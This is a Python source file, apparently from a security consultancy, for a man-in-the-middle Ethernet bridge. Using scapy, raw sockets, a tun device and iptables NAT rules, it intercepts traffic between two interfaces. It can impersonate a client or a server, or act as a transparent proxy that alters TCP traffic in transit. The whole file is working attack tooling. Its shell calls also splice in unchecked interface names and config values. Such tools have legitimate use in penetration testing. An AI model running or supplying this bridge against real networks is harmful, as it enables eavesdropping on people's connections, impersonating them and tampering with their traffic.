#! /usr/bin/env python
# -*- coding: ASCII -*-

"""

Ethernet Bridge

Description: Ethernet bridge for man-in-the-middle attacks.

Markus Mahrla, Jon Barg
GAI NetConsult GmbH

"""

import sys
import signal
import os
import struct
from pdb import *
from scapy.all import *
from socket import *
from argparse import *
from threading import *
from ConfigParser import *
from fcntl import ioctl

MTU = 32676             # read from socket without bothering on MTU
ETH_P_ALL = 0x03        # capture all bytes of packet including ethernet layer

TUNSETIFF = 0x400454ca  # attach to tun/tap device
IFF_TUN = 0x0001        # utilize tap device, i.e. including ethernet layer
IFF_NO_IP = 0x1000      # omit packet information that is added by kernel

SRC_IP_POS = 0x1a       # position of ip source address in packet
DST_IP_POS = 0x1e       # position of ip destination address in packet
SRC_PORT_POS = 0x22     # position of source port address in packet
DST_PORT_POS = 0x24     # position of destination port address in packet

BUFFERSIZE_DEV = 65000  # read from tap device without bothering on MTU


class MITMBridge():

    def __init__(self, interface1, interface2, tun_device):

        # bridge traffic between ethernet interfaces and intercept to tun0
        if tun_device:
            self.socket1 = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
            self.socket1.bind((interface1, ETH_P_ALL))

            self.socket2 = socket(AF_PACKET, SOCK_RAW)
            self.socket2.bind((interface2, ETH_P_ALL))

            self.receive = self.socket_receive
            self.send = lambda pkt: self.socket2.send(pkt)
            self.intercept = self.device_send

        # send traffic from tun device back to ethernet interfaces
        else:
            self.socket1 = socket(AF_PACKET, SOCK_RAW)
            self.socket1.bind((interface1, ETH_P_ALL))

            self.socket2 = socket(AF_PACKET, SOCK_RAW)
            self.socket2.bind((interface2, ETH_P_ALL))

            self.receive = self.device_receive
            self.send = lambda pkt: self.socket2.send(pkt)
            self.intercept = lambda pkt: self.socket1.send(pkt)

    def lock_check(self):
        return not still_running_lock.locked()

    # traffic is intercepted based on ip address and network port
    def filter(self, filter, pkt_ip, pkt_port):
        for address in filter:
            if address[0] == pkt_ip or address[0] == "\x00\x00\x00\x00":
                if address[1] == pkt_port:
                    return True
        return False

    def source_is_server(self, pkt):
        return self.filter(server_filter, pkt[SRC_IP_POS:SRC_IP_POS+4],
                           pkt[SRC_PORT_POS:SRC_PORT_POS+2])

    def destination_is_server(self, pkt):
        return self.filter(server_filter, pkt[DST_IP_POS:DST_IP_POS+4],
                           pkt[DST_PORT_POS:DST_PORT_POS+2])

    # traffic leaving mitm interface is written back to original addresses
    def device_receive(self):
        try:
            # read and interpret packet
            p = os.read(tun_device, BUFFERSIZE_DEV)
            pkt_scapy = IP(p)

            # delete checksums
            if pkt_scapy.getlayer("IP"):
                del pkt_scapy[IP].chksum
            if pkt_scapy.getlayer("TCP"):
                del pkt_scapy[TCP].chksum

            # adjust packet if it is going to client
            if pkt_scapy[IP].dst == client_ip:
                return str(Ether(dst=client_mac, src=server_mac) / pkt_scapy)
            # adjust packet to any other destination
            else:
                pkt_scapy[IP].src = client_ip
                return str(Ether(dst=server_mac, src=client_mac) / pkt_scapy)

        except error:
            pass

    # traffic to mitm interface is modified to be recognised by tcp/ip stack
    def device_send(self, pkt):
        try:
            pkt_scapy = IP(pkt[14:])
            del pkt_scapy[IP].chksum
            del pkt_scapy[TCP].chksum
            os.write(tun_device, str(pkt_scapy))
        except error:
            pass

    def socket_receive(self):
        pkt, sa = self.socket1.recvfrom(MTU)
        if sa[2] != PACKET_OUTGOING:
            return pkt

    def run_bridge(self):
        pkt = ""
        while True:
            try:
                pkt = self.receive()
            except error:
                pass
            if pkt:

                # packets can be manipulated before sending, e.g. via Scapy
                if mode == 0:
                    self.send(pkt)

                # mode to impersonate client
                elif mode == 1:
                    # traffic from server to client is diverted to mitm
                    if self.source_is_server(pkt):
                        self.intercept(pkt)
                    # drop requests from original client to server
                    elif self.destination_is_server(pkt) and \
                            self.receive == self.socket_receive:
                        pass
                    else:
                        self.send(pkt)

                # mode to impersonate server and respond to client directly
                elif mode == 2:
                    # traffic from client is diverted to mitm and sent back
                    if self.destination_is_server(pkt) or\
                            self.source_is_server(pkt):
                        self.intercept(pkt)
                    else:
                        self.send(pkt)

                # mode to manipulate traffic on the fly (transparent tcp proxy)
                elif mode == 3:
                    # handle traffic coming from bridged interfaces
                    if self.receive == self.socket_receive:
                        # traffic from client and server is diverted to mitm
                        if self.destination_is_server(pkt) or\
                           self.source_is_server(pkt):
                            self.intercept(pkt)
                        else:
                            self.send(pkt)
                    # handle traffic coming from mitm interface
                    if self.receive == self.device_receive:
                        # traffic from mitm interface to client is diverted
                        # back to client
                        if self.source_is_server(pkt):
                            self.intercept(pkt)
                        else:
                            self.send(pkt)

                if self.lock_check() == True:
                    break

thread1 = None
thread2 = None
thread3 = None


still_running_lock = Lock()


def signal_handler(signal, frame):
    still_running_lock.release()
    thread1.join()
    thread2.join()
    thread3.join()
    sys.exit(0)

if __name__ == '__main__':

    parser = ArgumentParser(description='Man-in-the-Middle Ethernet Bridge',
                            formatter_class=RawTextHelpFormatter)

    parser.add_argument("-f", nargs=1, dest="file_name", type=str,
                        action='store',
                        help='config file to run different modes (interfaces' +
                        ' are bridged in each mode)\nsyntax of first line: ' +
                        '<mode> <client mac> <client ' +
                        'ip> <server/gateway mac>\n' +
                        'mode=0: bridge mode (traffic is not intercepted)\n' +
                        'mode=1: impersonate a client while connecting to ' +
                        'a server\nmode=2: impersonate a server and wait ' +
                        'for client requests\nmode=3: manipulate traffic ' +
                        'on the fly, i.e. as transparent tcp proxy\n' +
                        'syntax of other lines (each address is ' +
                        'intercepted):\n<server ip> <server port>\n')
    parser.add_argument("-r", dest="rewrite", action='store_true',
                        help='rewrite mac address in case of ' +
                        'point-to-point protocols, e.g. if Wifi or 3G is ' +
                        'used on one of the interfaces')
    parser.add_argument("interface1", nargs=1, type=str, action='store',
                        help='first interface to bridge')
    parser.add_argument("interface2", nargs=1, type=str, action='store',
                        help='second interface to bridge')

    args = parser.parse_args()

    interface1 = args.interface1[0]
    interface2 = args.interface2[0]

    # read config file if present (default is bridge mode)
    server_filter = []
    client_filter = []
    if args.file_name:
        file = open(args.file_name[0]).readlines()
        mode, client_mac, client_ip, server_mac = file[0].split(" ")
        for line in file[1:]:
            server_ip, server_port = line.split(" ")
            server_filter.append([inet_aton(server_ip), struct.pack(">H",
                                 int(server_port))])
    else:
        mode = "0"
    mode = int(mode)

    # set bridged interface in promiscuous mode
    os.system("ifconfig " + interface1 + " promisc")
    os.system("ifconfig " + interface2 + " promisc")

    # utilize tun device to intercept traffic
    if mode != 0:
        # add tun device and assign IP address
        os.system("ip tuntap add dev tun0 mode tun")
        os.system("ifconfig tun0 1.2.3.4")
        # add network route so kernel sends traffic via tun device by default
        os.system("route add -net 0.0.0.0 netmask 0.0.0.0 tun0")
        # rewrite ip address of tun device via iptables which also
        # facilitates transparent proxying for user-space applications
        os.system("iptables -t nat -F")
        os.system("iptables -t nat -A PREROUTING -i tun0 -p tcp -j REDIRECT")
        os.system("iptables -t nat -A POSTROUTING -s 1.2.3.4 " +
                  "-j SNAT --to-source " + client_ip)

    # create file descriptor for tun device to read from and write to
    tun_device = os.open('/dev/net/tun', os.O_RDWR)
    flags = struct.pack('16sH', "tun0", IFF_TUN | IFF_NO_IP)
    ioctl(tun_device, TUNSETIFF, flags)

    # create three threads that receive, intercept and sent traffic
    bridge1 = MITMBridge(interface1, interface2, True)
    bridge2 = MITMBridge(interface2, interface1, True)
    bridge3 = MITMBridge(interface1, interface2, False)

    thread1 = Thread(target=bridge1.run_bridge)
    thread2 = Thread(target=bridge2.run_bridge)
    thread3 = Thread(target=bridge3.run_bridge)

    still_running_lock.acquire()

    thread1.start()
    thread2.start()
    thread3.start()

    signal.signal(signal.SIGINT, signal_handler)
    signal.pause()
